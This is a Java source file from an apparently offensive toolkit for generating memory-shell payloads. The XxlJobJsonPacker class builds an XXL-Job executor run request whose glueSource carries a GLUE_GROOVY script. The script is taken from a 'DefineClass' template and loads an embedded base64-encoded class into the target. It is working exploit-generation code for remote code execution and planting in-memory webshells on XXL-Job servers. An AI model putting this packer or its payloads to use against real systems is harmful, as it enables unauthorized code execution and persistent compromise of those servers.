package com.reajason.javaweb.packer.xxljob;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.Util;
import org.kohsuke.MetaInfServices;

/**
 * @author ReaJason
 * @since 2025/1/21
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.XxlJobJson, parent = Packers.XxlJob, order = 3210)
public class XxlJobJsonPacker implements Packer {
    private static final char[] HEX = "0123456789abcdef".toCharArray();

    private final String template = Util.loadTemplateFromResource("/memshell-party/XXL-Job-DefineClass.java");

    @Override
    public String pack(ClassPackerConfig config) {
        String source = template.replace("{{className}}", config.getClassName())
                .replace("'{{base64Str}}'", Util.toSingleQuotedConcatLiteral(config.getClassBytesBase64Str()));
        long now = System.currentTimeMillis();

        StringBuilder json = new StringBuilder(source.length() + 512);
        json.append("{\n")
                .append("  \"jobId\" : 1,\n")
                .append("  \"executorHandler\" : \"demoJobHandler\",\n")
                .append("  \"executorParams\" : \"demoJobHandler\",\n")
                .append("  \"executorBlockStrategy\" : \"COVER_EARLY\",\n")
                .append("  \"executorTimeout\" : 0,\n")
                .append("  \"logId\" : 1,\n")
                .append("  \"logDateTime\" : ").append(now).append(",\n")
                .append("  \"glueType\" : \"GLUE_GROOVY\",\n")
                .append("  \"glueSource\" : ");
        appendJsonString(json, source);
        json.append(",\n")
                .append("  \"glueUpdatetime\" : ").append(now).append(",\n")
                .append("  \"broadcastIndex\" : 0,\n")
                .append("  \"broadcastTotal\" : 0\n")
                .append('}');
        return json.toString();
    }

    /**
     * 手写 JSON 字符串字段：glueSource 含换行、引号和反斜杠，必须按 JSON 规则转义。
     * 只构造这一处固定结构，不值得为此保留 jackson-databind 运行期依赖。
     */
    private static void appendJsonString(StringBuilder out, String value) {
        out.append('"');
        for (int i = 0; i < value.length(); i++) {
            char ch = value.charAt(i);
            switch (ch) {
                case '"':
                    out.append("\\\"");
                    break;
                case '\\':
                    out.append("\\\\");
                    break;
                case '\b':
                    out.append("\\b");
                    break;
                case '\f':
                    out.append("\\f");
                    break;
                case '\n':
                    out.append("\\n");
                    break;
                case '\r':
                    out.append("\\r");
                    break;
                case '\t':
                    out.append("\\t");
                    break;
                default:
                    if (ch < 0x20) {
                        out.append("\\u")
                                .append(HEX[(ch >> 12) & 0xF])
                                .append(HEX[(ch >> 8) & 0xF])
                                .append(HEX[(ch >> 4) & 0xF])
                                .append(HEX[ch & 0xF]);
                    } else {
                        out.append(ch);
                    }
            }
        }
        out.append('"');
    }
}
